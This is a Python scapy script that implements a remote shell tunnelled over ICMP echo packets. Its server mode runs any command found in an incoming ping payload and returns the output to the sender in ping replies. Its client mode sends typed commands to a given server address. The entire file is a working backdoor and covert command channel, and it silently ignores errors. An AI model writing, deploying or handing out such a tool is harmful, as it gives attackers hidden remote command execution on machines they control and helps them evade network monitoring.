import threading
from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether, ICMP
import sys
import os
def sniff_icmp_commands(pkt):
    try: 
        if pkt[ICMP].type != 8:
            return
        destip = pkt[IP].dst
        srcip = pkt[IP].src
        content = pkt[Raw].load.decode()
        # Server side!
        if (user == 'server' and destip == serverip):
            # content = pkt[Raw].load.decode()
            if content.lower() == 'quit':
                print("quit")
                os._exit(0)
            if debug:
                print("debug: server received packet:  " + pkt.summary())
                print("debug: server received command: " + content)
            result = subprocess.check_output(content.split(' ')).decode()
            send(IP(dst = srcip) / ICMP(type=8) / result.encode(), iface=iface, verbose=False)
        # Client side!
        elif (user == 'client' and destip == get_if_addr(iface)):
            if debug:
                print("debug: client received packet:  " + pkt.summary())
            print(content)
            print("\n")
    except:
        pass


def start_sniffing(sig = None, frame = None):
    sniff(filter='icmp',iface=iface,prn=sniff_icmp_commands)

debug = False
argumentList = sys.argv[1:]
user = argumentList[0]
iface = argumentList[1]
serverip = argumentList[2]
if debug:
    print("debug: sniffing ICMP...")
threading.Thread(target=start_sniffing, args=(), daemon=True).start()

if user == 'client':
    while True:
        command = input()
        pkt = IP(dst = serverip) / ICMP(type = 8) / command.encode()
        send(pkt, iface=iface, verbose=False)
        if command == 'quit':
            break
elif user == 'server':
    while True:
        pass

